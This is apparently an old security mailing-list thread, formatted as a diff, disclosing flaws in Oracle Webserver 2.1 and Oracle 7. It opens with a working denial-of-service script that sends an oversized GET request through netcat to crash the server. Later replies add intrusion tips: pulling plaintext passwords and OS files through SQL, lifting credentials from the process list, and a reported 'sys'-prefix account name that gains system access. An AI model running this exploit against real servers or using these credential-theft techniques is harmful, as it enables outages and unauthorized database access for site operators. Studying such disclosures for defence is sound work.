@@ -1,0 +1,86 @@
+
+A DoS-attack
+against a Oracle Webserver 2.1 that serves PL/SQL stored procedures.
+
+The server dumps quietly, I haven't found anything in the logs. v2.0
+does not seem to exhibit this behaviour (v2.1 is the latest, but many
+sites seem to still run v2.0).
+
+I'm sorry if this is old news (but I'd appreciate of someone told me
+if there is a bugfix somewhere).
+
+(PL/SQL is, simply put, a scripting language within the Oracle database)
+
+---
+#!/bin/sh
+#
+# requires Perl and NetCat.
+#
+# usage:
+#       prg <host> <port> <path>
+#
+# example:
+#       # ./prg your.own.domain.com 80 /ows-bin
+#
+# if you have the PL/SQL stored procedure in /ows-bin/.
+#
+perl -e 'print "GET $ARGV[0]/fnord?foo=", "a" x 2600, " HTTP/1.0\n\n\n\n";' "$3"|nc $1 $2
+---
+
+
+=========================================================================
+
+
+The server dumps quietly because the DBA probably hasn't set up the database
+correctly.  Unless it is coded in to the system you're developing, I don't think
+Oracle will log activities:  i.e. as long as you stay in SQL*NET(an Oracle
+shell), no one will know you're around.
+
+I worked with Oracle 7 on an HP 9000 before it became web enabled.  I noticed
+that everytime something went wrong with the database, it would not show up in
+syslog (one of the logs you were thinking of?).  Now, the trick is to  find an
+account with the role and permission necessary to be able to run a sql script to
+get passwords from the database(or at this point, if you know enough about SQL,
+you can pull most text files from the Operating System).  I say this because as
+an administrator, I found that all our users chose to have a database password
+the same as a machine password.  Guess what?  Oracle has it's passwords in plain
+text!
+
+As a side note, we discovered that Oracle accounts don't have to have machine
+accounts.  Those were used for another aspect of the product we fielded.
+
+
+==========================================================================
+
+
+The old Oracle Webserver 1.0.2.0.2 cannot be attacked this way. There seem
+to be hard limits of 32 lines HTTP-Request, 1540 chars on the GET/HEAD
+statement and 4096 chars on every additional header line.
+
+
+==========================================================================
+
+
+>you can pull most text files from the Operating System).  I say this because as
+>an administrator, I found that all our users chose to have a database password
+>the same as a machine password.  Guess what?  Oracle has it's passwords in plain
+>text!
+
+Also, the sqlnet client program accepts command-line parameters for username,
+and password. If I recall correctly, its something like:
+
+sqlnet user/password@INSTANCE_NAME
+
+so, in order to gain unauthorized access to the database, all one has to do
+is grep through the machines proc list.
+
+On another note, Im not sure which version of oracle this is applicable to (I believe
+it is 7X), and I dont recall seeing this bug posted before, 
+but the database authentication mechanism appears to do a regular expression 
+on the account name for /^sys/ before authenticating it, and upon a match, 
+assigning system level access to that account.
+I.E. - If your account name is sysdood or sysenor, oracle assumes you are infact
+system, and logs you in as such.
+
+
+============================================================================
